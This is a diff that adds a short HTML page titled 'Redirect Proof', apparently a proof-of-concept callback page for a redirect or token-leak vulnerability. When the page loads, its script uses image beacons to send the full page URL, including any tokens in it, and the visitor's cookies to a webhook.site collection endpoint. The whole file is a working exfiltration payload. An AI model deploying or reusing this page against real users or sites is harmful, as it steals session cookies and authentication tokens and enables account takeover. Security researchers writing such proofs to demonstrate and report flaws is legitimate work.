@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Redirect Proof</title>
+</head>
+<body>
+<script>
+/* Proof of token / URL leakage */
+new Image().src =
+  "https://webhook.site/e88b121d-c98b-4880-a224-cd0a1fa35fd1?url=" +
+  encodeURIComponent(window.location.href);
+
+/* Optional: cookie attempt */
+new Image().src =
+  "https://webhook.site/e88b121d-c98b-4880-a224-cd0a1fa35fd1?cookie=" +
+  encodeURIComponent(document.cookie);
+</script>
+
+<h1>Callback reached</h1>
+</body>
+</html>
